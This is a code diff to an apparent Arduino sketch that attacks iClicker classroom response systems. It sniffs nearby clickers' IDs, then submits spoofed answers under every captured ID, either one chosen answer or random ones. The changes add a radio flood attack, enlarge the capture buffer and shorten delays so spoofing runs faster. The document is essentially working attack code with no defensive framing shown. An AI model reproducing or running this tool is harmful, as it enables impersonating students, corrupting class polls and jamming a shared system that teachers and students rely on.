@@ -5,10 +5,13 @@
 
 #define IRQ_PIN 6
 #define CSN 10
-#define MAX_BUFFERED_PACKETS 20
+#define MAX_BUFFERED_PACKETS 50
 
 #define THRESHOLD 1000
 #define MAX_RECVD 500
+
+#define RAND_LOW 35
+#define RAND_HIGH 75
 iClickerAnswerPacket_t recvd[MAX_RECVD];
 uint32_t num_recvd = 0;
 
@@ -65,6 +68,10 @@ void loop()
         clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
         break;
 
+       case 'u':
+         uniform_ans();
+         break;
+
       case 'p':
         printCap();
         break;
@@ -106,6 +113,7 @@ void updateRef(iClickerAnswerPacket_t p)
 void corrupt_ans(iClickerAnswer_t a)
 {
   char tmp[50];
+  clicker.floodAttack(random(RAND_LOW, RAND_HIGH), 1);
   for (uint32_t i = 0; i < num_recvd; i++)
   {
     char answer = iClickerEmulator::answerChar(a);
@@ -113,9 +121,27 @@ void corrupt_ans(iClickerAnswer_t a)
     snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)\n",
     ret ? "Successfully submitted" : "Failed to submit",answer, recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
     Serial.println(tmp);
-    delay(100);
+    delay(5);
   }
+  
 }
+
+
+void uniform_ans()
+{
+  for (uint32_t i = 0; i < num_recvd; i++)
+  {
+    char tmp[50];
+    iClickerAnswer_t answer = clicker.randomAnswer();
+    bool ret = clicker.submitAnswer(recvd[i].id, answer); // no ack
+    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)\n",
+    ret ? "Successfully submitted" : "Failed to submit",answer, recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
+    Serial.println(tmp);
+    delay(5);
+  }
+  
+}
+
 
 
 void printCap()
